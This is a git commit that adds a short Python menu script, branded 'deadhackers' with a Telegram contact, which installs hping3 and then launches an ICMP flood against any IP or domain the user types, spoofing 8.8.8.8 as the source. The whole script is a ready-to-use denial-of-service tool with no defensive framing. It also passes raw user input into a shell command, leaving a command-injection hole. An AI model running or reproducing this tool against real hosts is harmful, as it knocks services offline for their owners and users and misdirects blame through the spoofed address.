6f3bbb4296e6711579b35e412582a98b32305163
deadhackers <140397454+deadhackers@users.noreply.github.com>
2023-07-24 06:39:53 -0700

    Add files via upload

---
+++ deadhacker.py
@@ -0,0 +1,48 @@
+import subprocess
+
+print ("""
+
+▐██▄░▐██▌░▐█░░███▄░▐▌░█░░▐█░░▄██▌▐▌▄█░███▄███░███
+▐▌▀█▄▐▌░░░██▄░█░▀█░▐▌░█░░██▄░█▌░▀▐▌█▌░█░░▐█░█░█░▀
+▐▌░▐▌▐▌░░░█▐▌░█░░█▌▐█▄█░░█▐▌░█░░░▐██░░█░░▐█░█░█▄
+▐▌░▐▌▐██░▄▌▀█░█░░▐▌▐███░▐▌▀█░█░░░▐██░░██▌▐███░▀██
+▐▌░▐▌▐▌░░▐█▄█░█░░█▌▐▌░█░▐█▄█░█░░░▐▌█▄░█░░▐█▀█░░░█
+▐█▄█▀▐█▄▄█▀▀█▄█▄▄█░▐▌░█░█▀▀█▄██░▄▐▌▐█░█▄▄▐█░█░▄▄█
+▐██▀░▐██▌█░░▐▌███▀░▐▀░█░█░░▐▌▀██▀▐▌░█░███▀█░▐▌██▀
+                                                                                           
+""")
+
+mg= ("telegram : @deadhackers1")
+long= len(mg) + 8
+print('\033[1;91m'"#"+ long * '-' + "#"'\033[1;91m')
+print("|"+ long*' '+"|")
+print("|"+4*' '+mg+4*' '+"|")
+print("|"+ long * ' ' + "|")
+print("#"+ long * '-' + "#")
+
+while(True):
+	print("""
+	deadhackers |
+	1- Install hping3
+       
+	2- Launch DoS attack whit hping3
+	3- Exit
+	\033[1;m
+	""")
+
+	op=input("\033[1;91m> \033[1;m")
+
+	if op=='1':
+		subprocess.call('sudo apt-get install hping3 -y', shell=True)
+
+	elif op=='2':
+		ip= input('\033[1;91mGive me a ip or domain: \033[1;m')
+		ping= ('hping3 --icmp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
+		subprocess.call(ping + ip, shell=True)
+
+	elif op=='3':
+		break
+
+	else:
+		print("\033[1;93mError!\033[1;m")
+
